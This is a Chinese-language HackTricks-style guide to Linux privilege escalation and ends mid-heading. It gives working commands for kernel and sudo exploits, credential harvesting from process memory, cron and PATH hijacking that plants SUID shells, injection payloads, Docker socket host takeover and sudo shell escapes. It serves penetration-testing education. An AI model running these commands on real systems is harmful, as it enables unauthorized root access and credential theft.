# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 系统信息

### OS 信息

让我们开始获取关于正在运行的 OS 的一些信息
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

如果你对 **`PATH` 变量中的任何文件夹具有写入权限**，你可能能够劫持某些库或二进制文件：
```bash
echo $PATH
```
### 环境信息

环境变量中是否包含有趣的信息、密码或 API 密钥？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

检查 kernel 版本，查看是否存在可以用来 escalate privileges 的 exploit
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
你可以在这里找到一个不错的 vulnerable kernel list 和一些已经 **compiled exploits**： [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
其他可以找到一些 **compiled exploits** 的站点： [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网站提取所有 vulnerable kernel versions，你可以做：
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
可以帮助查找内核漏洞利用的工具有：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (在受害主机上执行，仅检查 2.x 内核的漏洞利用)

始终 **在 Google 上搜索内核版本**，可能你的内核版本已经出现在某个内核漏洞利用中，这样你就能确定该漏洞利用是否有效。

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 版本

基于出现在以下位置的易受攻击的 sudo 版本：
```bash
searchsploit sudo
```
你可以使用这个 grep 检查 sudo 版本是否存在漏洞。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

来自 @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 签名验证失败

查看 **smasher2 box of HTB**，了解如何利用该 vuln 的 **示例**
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 列举可能的防御措施

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux（安全增强的 Linux）
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

如果你在 docker container 内，你可以尝试从中逃逸：

{{#ref}}
docker-security/
{{#endref}}

## 驱动器

检查 **what is mounted and unmounted**、挂载位置以及原因。如果有任何未挂载的设备，你可以尝试将其 mount 并检查是否有敏感信息。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用的软件

列举有用的二进制文件
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
另外，检查是否安装了**任何编译器**。如果需要使用某些 kernel exploit，这很有用，因为建议在将要使用它的机器上（或在一台类似的机器上）进行编译。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Vulnerable Software Installed

检查**已安装的软件包和服务的版本**。可能存在旧的 Nagios 版本（例如），可以被利用来进行 escalating privileges…\
建议手动检查更可疑的已安装软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _请注意，这些命令会显示大量大多无用的信息，因此建议使用 OpenVAS 或类似工具来检查已安装的软件版本是否容易受到已知 exploits 的利用。_

## Processes

查看正在执行的 **哪些进程**，并检查是否有任何进程拥有 **比它应有的更多权限**（例如由 root 运行的 tomcat？）
```bash
ps aux
ps -ef
top -n 1
```
始终检查是否有可能的 [**electron/cef/chromium debuggers** 正在运行，你可以滥用它来提升权限](electron-cef-chromium-debugger-abuse.md)。 **Linpeas** 通过检查进程命令行中的 `--inspect` 参数来检测它们。\
另外 **检查你对进程二进制文件的权限**，也许你可以覆盖某些可执行文件。

### 进程监控

你可以使用像 [**pspy**](https://github.com/DominicBreuker/pspy) 这样的工具来监控进程。这在识别经常被执行或在满足一组条件时触发的易受攻击进程时非常有用。

### 进程内存

一些服务器服务会在内存中以**明文**保存凭据。\
通常你需要 **root privileges** 来读取属于其他用户的进程内存，因此这通常在你已经是 root 并想发现更多凭据时更有用。\
但是，记住 **作为普通用户你可以读取你自己拥有的进程的内存**。

> [!WARNING]
> 注意如今大多数机器**默认不允许 ptrace**，这意味着你无法转储属于其他用户的进程（如果你是非特权用户）。 
>
> 文件 _**/proc/sys/kernel/yama/ptrace_scope**_ 控制 ptrace 的可访问性：
>
> - **kernel.yama.ptrace_scope = 0**: 所有进程都可以被调试，只要它们具有相同的 uid。这是 ptracing 的传统工作方式。
> - **kernel.yama.ptrace_scope = 1**: 只有父进程可以被调试。
> - **kernel.yama.ptrace_scope = 2**: 只有管理员可以使用 ptrace，因为它需要 CAP_SYS_PTRACE 能力。
> - **kernel.yama.ptrace_scope = 3**: 不能用 ptrace 跟踪任何进程。设置后需要重启才能再次启用 ptrace。

#### GDB

如果你可以访问某个 FTP 服务（例如）的内存，你可以获取 Heap 并在其中搜索凭据。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 脚本
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程 ID，**maps 显示该进程的内存如何映射** 的虚拟地址空间；它还显示**每个映射区域的权限**。该 **mem** 伪文件**暴露了进程的内存本身**。从 **maps** 文件我们可以知道哪些**内存区域是可读的**以及它们的偏移。我们使用这些信息**在 mem 文件中定位并转储所有可读区域**到一个文件。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统的**物理**内存的访问，而不是虚拟内存。内核的虚拟地址空间可以使用 /dev/kmem 访问。\
通常，`/dev/mem` 仅对 **root** 和 **kmem** 组可读。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump 用于 linux

ProcDump 是对 Sysinternals 套件中用于 Windows 的经典 ProcDump 工具在 Linux 上的重新构想。可在以下地址获取： [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 工具

要 dump 进程内存，你可以使用：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_你可以手动移除 root 要求并 dump 你拥有的进程
- Script A.5 来自 [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (需要 root)

### 从进程内存获取凭证

#### 手动示例

如果发现 authenticator 进程正在运行：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
你可以 dump the process（参见前面的章节以了解 dump the memory of a process 的不同方法），并在 memory 中搜索 credentials：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

该工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 会**从内存中窃取明文凭证**并从一些**已知文件**中获取凭证。它需要 root 权限才能正常工作。

| 功能                                              | 进程名称             |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 搜索正则/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

检查是否有任何计划任务易受攻击。也许你可以利用由 root 执行的脚本（wildcard vuln? 能否修改 root 使用的文件? 使用 symlinks? 在 root 使用的目录中创建特定文件?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron 路径

例如，在 _/etc/crontab_ 你可以找到 PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

_（注意用户 "user" 对 /home/user 有写权限）_

如果在这个 crontab 中 root 用户尝试在不设置 PATH 的情况下执行某个命令或脚本。例如： _\* \* \* \* root overwrite.sh_\
那么，你可以通过以下方式获得 root shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron 使用带通配符的脚本 (Wildcard Injection)

如果一个由 root 执行的脚本在命令中包含 “**\***”，你可以利用这一点导致意想不到的结果（比如 privesc）。示例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果通配符前面有路径比如** _**/some/path/***_ **，就不会受到影响（即使** _**./***_ **也不）。**

阅读以下页面以获取更多通配符利用技巧：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash 在 ((...)), $((...)) 和 let 中进行算术求值之前会执行 parameter expansion 和 command substitution。如果 root cron/parser 读取不受信任的日志字段并将其传入算术上下文，攻击者可以注入一个 command substitution $(...)，当 cron 运行时以 root 身份执行。

- Why it works: 在 Bash 中，expansions 按如下顺序发生：parameter/variable expansion、command substitution、arithmetic expansion，然后是 word splitting 和 pathname expansion。所以像 `$(/bin/bash -c 'id > /tmp/pwn')0` 这样的值会先被替换（运行该命令），之后剩下的数字 `0` 会用于算术运算，从而使脚本继续而不会报错。

- 典型的易受攻击的模式：
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: 让攻击者控制的文本写入被解析的日志，使看起来像数字的字段包含 command substitution 并以数字结尾。确保你的命令不要向 stdout 输出（或将其重定向），以便算术表达式保持有效。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

如果你 **可以修改 cron script**（由 root 执行），可以非常容易地获得一个 shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果由 root 执行的脚本使用一个 **你拥有完全访问权限的目录**，那么删除该目录并 **创建一个指向另一个由你控制并提供脚本的 symlink 目录** 可能会很有用。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 频繁的 cron jobs

你可以监视进程，查找每隔 1、2 或 5 分钟执行的进程。也许你可以利用它并 escalate privileges。

例如，要 **在 1 分钟内每 0.1s 监控**、**按执行次数最少排序** 并删除被执行次数最多的命令，你可以做：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**你也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（它会监视并列出每个启动的进程）。

### 隐形 cron jobs

可以创建一个 cronjob，通过**在注释后放置回车符**（没有换行字符），使该 cron job 生效。示例（注意回车字符）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 服务

### 可写的 _.service_ 文件

检查是否可以写入任何 `.service` 文件。如果可以，你**可以修改它**，使其在服务**启动**、**重启**或**停止**时**执行**你的**backdoor**（可能需要等到机器重启）。  
例如，在 `.service` 文件中创建你的 backdoor，使用 **`ExecStart=/tmp/script.sh`**

### 可写的服务二进制文件

请记住，如果你对由服务执行的二进制文件具有**写权限**，你可以将它们更改为 backdoors，这样当服务被重新执行时，backdoors 就会被执行。

### systemd PATH - 相对路径

你可以通过以下方式查看 **systemd** 使用的 PATH：
```bash
systemctl show-environment
```
如果你发现可以在该路径的任一文件夹中**write**，你可能能够**escalate privileges**。你需要搜索在服务配置文件中使用的**相对路径**，例如：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，在你可写入的 systemd PATH folder 中创建一个与相对路径二进制文件同名的 **executable**，当服务被要求执行易受攻击的操作（**Start**、**Stop**、**Reload**）时，你的 **backdoor** 将被执行（非特权用户通常无法 start/stop services，但检查是否可以使用 `sudo -l`）。

**Learn more about services with `man systemd.service`.**

## **Timers**

Timers 是 systemd 的 unit 文件，名称以 `**.timer**` 结尾，用于控制 `**.service**` 文件或事件。Timers 可以作为 cron 的替代，因为它们内建对日历时间事件 (calendar time events) 和单调时间事件 (monotonic time events) 的支持，并且可以异步运行。

You can enumerate all the timers with:
```bash
systemctl list-timers --all
```
### 可写的 timer

如果你可以修改一个 timer，你可以让它执行一些 systemd.unit 的现有项（比如 `.service` 或 `.target`）
```bash
Unit=backdoor.service
```
在文档中可以看到 Unit 是什么：

> 在该 timer 到期时要激活的 unit。参数是一个 unit name，其后缀不是 ".timer"。如果未指定，该值默认为一个 service，其名称与 timer unit 相同，但后缀不同。（见上文。）建议被激活的 unit name 与 timer unit 的 unit name 除后缀外保持一致。

因此，要滥用此权限，你需要：

- 找到某个 systemd unit（例如 `.service`），它正在 **执行一个可写的 binary**
- 找到某个 systemd unit，它正在 **执行一个相对路径**，并且你对 **systemd PATH** 拥有 **writable privileges**（以冒充该可执行文件）

**使用 `man systemd.timer` 了解有关 timers 的更多信息。**

### **启用 Timer**

要启用 timer，你需要 root 权限并执行：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意，**timer** 是通过在 `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` 上创建一个符号链接来**激活**的。

## 套接字

Unix Domain Sockets (UDS) 在客户端-服务器模型中允许在同一台或不同机器上进行**进程间通信**。它们使用标准 Unix 描述符文件进行主机间通信，并通过 `.socket` 文件进行配置。

套接字可以使用 `.socket` 文件进行配置。

**使用 `man systemd.socket` 了解更多关于套接字的信息。** 在此文件中，可以配置多个有趣的参数：

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 这些选项各不相同，但总体上用于**指示将在哪里监听**该套接字（AF_UNIX 套接字文件的路径、要监听的 IPv4/6 和/或端口号等）。
- `Accept`: 接受一个 boolean 参数。如果 **true**，则会为每个传入连接生成一个**service 实例**，并且仅将连接套接字传递给它。如果 **false**，所有监听套接字本身将**传递给启动的 service 单元**，并且只为所有连接生成一个 service 单元。对于 datagram 套接字和 FIFOs，此值被忽略，在那里单个 service 单元无条件处理所有传入流量。**默认值为 false**。出于性能原因，建议在编写新的 daemon 时以适合 `Accept=no` 的方式编写。
- `ExecStartPre`, `ExecStartPost`: 接受一个或多个命令行，在监听的 **套接字**/FIFOs 分别被**创建**并绑定之前或之后**执行**。命令行的第一个词元必须是绝对文件名，随后是进程的参数。
- `ExecStopPre`, `ExecStopPost`: 额外的**命令**，在监听的 **套接字**/FIFOs 分别被**关闭**并移除之前或之后**执行**。
- `Service`: 指定在**传入流量**时要**激活**的 **service** 单元名称。此设置仅允许用于 Accept=no 的套接字。默认使用与套接字同名（替换后缀）的 service。在大多数情况下，不需要使用此选项。

### 可写的 .socket 文件

如果你发现一个**可写**的 `.socket` 文件，你可以在 `[Socket]` 部分的开头**添加**类似 `ExecStartPre=/home/kali/sys/backdoor` 的内容，backdoor 将在套接字被创建之前执行。因此，你**可能需要等待机器重启。**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### 可写的套接字

如果你**发现任何可写的套接字**（_这里我们指的是 Unix Sockets，而不是配置的 `.socket` 文件_），那么**你可以与该套接字进行通信**，并可能利用其中的漏洞。

### 枚举 Unix 套接字
```bash
netstat -a -p --unix
```
### 原始连接
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**利用示例：**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

注意，可能存在一些用于监听 HTTP 请求的 sockets（_我不是指 .socket 文件，而是作为 unix sockets 的文件_）。你可以用下面的命令检查：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
如果该 socket **对 HTTP 请求有响应**，那么你可以**与其通信**，并且可能**利用某些漏洞**。

### 可写的 Docker Socket

Docker socket，通常位于 `/var/run/docker.sock`，是一个需要保护的重要文件。默认情况下，它对 `root` 用户和 `docker` 组的成员可写。拥有对该 socket 的写权限可能导致权限提升。下面是如何实现以及在无法使用 Docker CLI 时的替代方法的分解说明。

#### **Privilege Escalation with Docker CLI**

如果你对 Docker socket 拥有写权限，你可以使用以下命令提升权限：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
这些命令允许你运行一个容器，从而以 root 权限访问宿主机文件系统。

#### **Using Docker API Directly**

在 Docker CLI 不可用的情况下，仍可以使用 Docker API 和 `curl` 命令操作 Docker socket。

1.  **List Docker Images:** 检索可用镜像列表。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** 发送请求创建一个挂载宿主机根目录的容器。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** 使用 `socat` 建立与容器的连接，从而可以在其中执行命令。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

在建立 `socat` 连接后，你可以直接在容器内执行命令，并以 root 级别访问宿主机的文件系统。

### Others

注意，如果你对 docker socket 有写权限，因为你位于组 `docker` 内，你将有[**更多提权方式**](interesting-groups-linux-pe/index.html#docker-group)。如果[**docker API 在端口监听**，你也可能能够攻破它](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

在以下位置查看**更多从 docker 逃逸或滥用以提权的方法**：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) 提权

如果你发现可以使用 **`ctr`** 命令，请阅读以下页面，**因为你可能能够滥用它来提权**：


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** 提权

如果你发现可以使用 **`runc`** 命令，请阅读以下页面，**因为你可能能够滥用它来提权**：


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus 是一个复杂的进程间通信 (IPC) 系统，允许应用程序高效地交互和共享数据。它为现代 Linux 系统设计，提供了一个用于不同形式应用间通信的稳健框架。

该系统功能多样，支持增强进程间数据交换的基本 IPC，类似于增强版的 UNIX 域套接字。此外，它有助于广播事件或信号，促进系统组件之间的无缝集成。例如，Bluetooth 守护进程关于来电的信号可以促使音乐播放器静音，以改善用户体验。另一个方面，D-Bus 支持远程对象系统，简化了应用程序之间的服务请求和方法调用，优化了传统上较为复杂的流程。

D-Bus 基于允许/拒绝模型运行，基于匹配策略规则的累积效果来管理消息权限（方法调用、信号发射等）。这些策略指定了与总线的交互，可能通过滥用这些权限导致提权。

在 /etc/dbus-1/system.d/wpa_supplicant.conf 中提供了这样的策略示例，详细说明了 root 用户拥有、发送给和接收来自 `fi.w1.wpa_supplicant1` 的消息的权限。

未指定用户或组的策略普遍适用，而“default”上下文策略适用于所有未被其他特定策略覆盖的情况。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**在这里学习如何对 D-Bus 通信进行 enumerate 和 exploit：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **网络**

通常值得对网络进行 enumerate 并弄清主机的位置。

### 通用 enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 开放端口

在访问机器之前，始终检查在该机器上运行但你之前无法与之交互的网络服务：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

检查是否能 sniff traffic。 如果可以，你可能能够获取一些 credentials。
```
timeout 1 tcpdump
```
## 用户

### 通用枚举

检查你是 **who**，你拥有哪些 **privileges**，系统中有哪些 **users**，哪些可以 **login**，以及哪些拥有 **root privileges**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

某些 Linux 版本受到一个漏洞影响，允许具有 **UID > INT_MAX** 的用户提权。More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**利用它** 使用： **`systemd-run -t /bin/bash`**

### Groups

检查你是否是可能授予你 root 权限的**某个组的成员**：


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

检查剪贴板中是否有任何有趣的内容（如果可能）
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 已知密码

如果你 **知道环境中任何密码**，请 **尝试使用该密码登录每个用户**。

### Su Brute

如果你不介意产生大量噪音并且系统上存在 `su` 和 `timeout` 二进制文件，你可以尝试使用 [su-bruteforce](https://github.com/carlospolop/su-bruteforce)。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 使用 `-a` 参数也会尝试对用户进行暴力破解。

## 可写的 $PATH 滥用

### $PATH

如果你发现你可以 **在 $PATH 的某个文件夹中写入**，你可能能够通过 **在可写文件夹中创建 backdoor**，并将其命名为某个将由其他用户（理想情况下为 root）执行的命令，从而提升权限，前提是该命令**不会从位于你的可写文件夹之前的文件夹加载**。

### SUDO and SUID

你可能被允许使用 sudo 执行某些命令，或者某些命令可能设置了 suid 位。使用以下命令检查：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一些 **意想不到的 commands 允许你读取和/或写入 files 或甚至执行命令。** 例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 配置可能允许用户在不知晓密码的情况下，以另一个用户的权限执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在这个例子中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在通过将 ssh key 添加到 root 目录或调用 `sh` 来获得 shell 非常简单。
```
sudo vim -c '!sh'
```
### SETENV

此指令允许用户在执行某些操作时**设置环境变量**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
这个示例，**基于 HTB machine Admirer**，**存在漏洞**，可通过 **PYTHONPATH hijacking** 在以 root 身份执行脚本时加载任意 python library：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

